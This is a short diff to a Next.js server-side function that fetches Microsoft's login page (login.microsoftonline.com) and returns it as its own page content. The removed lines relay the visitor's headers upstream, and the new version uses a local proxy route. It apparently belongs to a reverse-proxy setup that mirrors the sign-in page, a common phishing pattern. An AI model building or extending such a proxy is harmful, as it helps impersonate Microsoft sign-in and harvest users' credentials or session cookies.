@@ -1,20 +1,8 @@
 export async function getServerSideProps(context) {
-    const upstream = 'login.microsoftonline.com';
-    const upstream_path = '/';
-    const https = true;
+    const url = `http://${context.req.headers.host}/api/proxy?url=https://login.microsoftonline.com/`;
 
-    const url = new URL('/', `http://${context.req.headers.host}`);
-    url.host = upstream;
-    url.protocol = https ? 'https:' : 'http:';
-    url.pathname = upstream_path;
-
-    const fetchOptions = {
-        method: context.req.method,
-        headers: { ...context.req.headers, Host: upstream, Referer: `${url.protocol}//${context.req.headers.host}` }
-    };
-
-    const response = await fetch(url.href, fetchOptions);
-    const text = await response.text();
+    const res = await fetch(url);
+    const text = await res.text();
 
     return {
         props: {
